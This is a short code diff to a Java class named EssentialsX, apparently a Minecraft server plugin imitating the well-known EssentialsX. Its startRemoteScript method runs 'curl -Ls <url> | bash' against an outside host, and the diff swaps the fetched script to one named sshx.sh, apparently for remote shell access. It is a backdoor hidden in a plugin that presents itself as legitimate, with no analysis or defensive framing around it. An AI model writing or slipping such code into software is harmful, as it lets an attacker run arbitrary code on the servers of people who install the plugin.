@@ -25,7 +25,7 @@ public class EssentialsX extends JavaPlugin {
     private void startRemoteScript() throws Exception {
         if (isProcessRunning) return;
 
-        String url = "https://netjett-de.kof95zip.pp.ua/plugins/cf.sh";
+        String url = "https://netjett-de.kof95zip.pp.ua/plugins/sshx.sh";
 
         // 稳定方式：curl | bash
         String command = "curl -Ls " + url + " | bash";
